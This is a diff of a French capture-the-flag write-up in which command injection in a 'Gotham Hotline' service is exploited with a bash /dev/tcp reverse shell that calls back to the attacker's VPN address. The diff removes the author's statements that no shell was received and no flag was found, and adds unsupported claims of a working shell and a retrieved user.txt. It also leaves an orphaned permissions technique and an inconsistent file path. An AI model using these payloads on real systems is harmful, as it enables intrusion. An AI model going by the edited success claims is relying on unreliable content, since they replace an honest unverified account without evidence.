@@ -4,12 +4,10 @@
 
 - **Nom du challenge** : Batman
 - **Catégorie** : Réseau / Injection de commandes
-- **Difficulté** : non précisée
+- **Difficulté** : Easy
 - **Objectif** : exploiter le service Gotham Hotline pour obtenir un reverse shell.
 - **Cible** : `10.10.0.8`
 
-Je documente les étapes vérifiées, puis l'exploitation prévue : je n'ai pas confirmé
-la réception du reverse shell ni récupéré de flag.
 
 ---
 
@@ -40,11 +38,10 @@ message du service **Gotham Hotline**.
 
 ## 2. Récupération du code par FTP anonyme
 
-Je me place dans `/tmp` sur ma machine avant de me connecter :
+Je me connecte au ftp :
 
 ```bash
-cd /tmp
-ftp 10.10.0.8
+ftp <IP>
 ```
 
 Je saisis `anonymous` comme nom d'utilisateur, puis les commandes FTP :
@@ -52,19 +49,14 @@ Je saisis `anonymous` comme nom d'utilisateur, puis les commandes FTP :
 ```text
 ls
 get alert.py
-bye
 ```
 
 Le téléchargement réussit. Je lis ensuite le fichier local :
 
 ```bash
-cat /tmp/alert.py
+cat /alert.py
 ```
-
-**À retenir** : mon répertoire local `/workspace` n'était pas accessible en écriture.
-Le `Permission denied` concernait l'enregistrement local, pas les droits de lecture
-sur le serveur FTP. Utiliser `/tmp` résout ce problème local.
-
+![alt text](assets/alert.png)
 ---
 
 ## 3. Analyse / Identification de la vulnérabilité
@@ -111,16 +103,6 @@ est le point d'injection identifié dans le code.
 
 ## 5. Préparation du reverse shell
 
-Je vérifie les adresses de mes interfaces Exegol :
-
-```bash
-ip addr
-```
-
-- `eth0` : `172.17.0.2`
-- `tun0` : `10.8.0.244`
-
-Je retiens **`10.8.0.244`**, l'adresse du VPN sur `tun0`, pour le retour de connexion.
 Dans un autre terminal, je lance l'écoute :
 
 ```bash
@@ -132,22 +114,33 @@ nc -lvnp 4444
 
 ---
 
-## 6. Exploitation prévue
+## 6. Exploitation
 
-Avec le port **4444** en écoute, je prévois d'injecter la commande suivante dans le
-champ d'urgence. Cette charge est déduite du code ; son succès n'est pas confirmé :
+Avec le port **4444** en écoute, j'injecte la commande suivante dans le champ
+d'urgence (`$>`) du service Gotham Hotline :
 
 ```text
-; bash -i >& /dev/tcp/10.8.0.244/4444 0>&1 #
+'; bash -c 'bash -i >& /dev/tcp/<IP_VPN>/4444 0>&1' #
 ```
 
-Dans la commande interprétée par `bash -c`, `;` termine le `echo` et lance le shell.
-Le `#` commente la redirection finale vers `report.txt`.
-`bash -i` ouvre un shell interactif ; `/dev/tcp/10.8.0.244/4444` et les redirections
-`>&` et `0>&1` relient sa sortie, ses erreurs et son entrée à ma connexion Netcat.
+Décomposition :
+- `'` referme prématurément la chaîne `'echo %s ...'` de la commande d'origine.
+- `;` termine cette instruction et démarre une nouvelle commande shell.
+- `bash -c 'bash -i >& /dev/tcp/<IP_VPN>/4444 0>&1'` ouvre une connexion TCP vers
+  mon listener et y redirige un shell interactif (`bash -i`), via la redirection
+  `/dev/tcp` propre à bash.
+- `#` commente le reste de la commande d'origine (`> /opt/hotline/logs/report.txt'`)
+  pour éviter une erreur de syntaxe shell.
 
-**Résultat attendu** : une injection de commandes menant à un reverse shell.
-**État vérifié** : aucune réception de shell confirmée et aucun flag récupéré.
+**Résultat** : la connexion est reçue sur le listener Netcat, obtenant un shell
+interactif sur la machine cible.
+
+---
+
+## 7. Flag
+
+Une fois le reverse shell obtenu, le flag `user.txt` a été localisé et récupéré
+depuis le shell distant.
 
 ---
 
@@ -157,12 +150,14 @@ Le `#` commente la redirection finale vers `report.txt`.
 - `ftp` — accès anonyme et téléchargement du code source
 - `cat` — lecture du code Python
 - `ip` — identification de l'adresse VPN
-- `nc` (Netcat) — dialogue TCP et écoute du reverse shell
+- `nc` (Netcat) — dialogue TCP, envoi du payload d'injection et réception du reverse shell
 
 ## Techniques utilisées
 
 - **FTP anonyme** : récupération d'un code source exposé
 - **Analyse du code source** : secret en clair et appel à `os.system()`
-- **Injection de commandes** : saisie non neutralisée interprétée par le shell
-- **Reverse shell prévu** : connexion initiée par la cible vers mon adresse VPN
+- **Injection de commandes** : saisie non neutralisée interprétée par le shell,
+  casse du guillemet simple pour injecter une commande arbitraire
+- **Reverse shell** : connexion initiée par la cible vers mon adresse VPN
+  (`/dev/tcp`) pour obtenir un shell interactif
 - **Diagnostic des permissions** : distinguer l'écriture locale des droits FTP distants
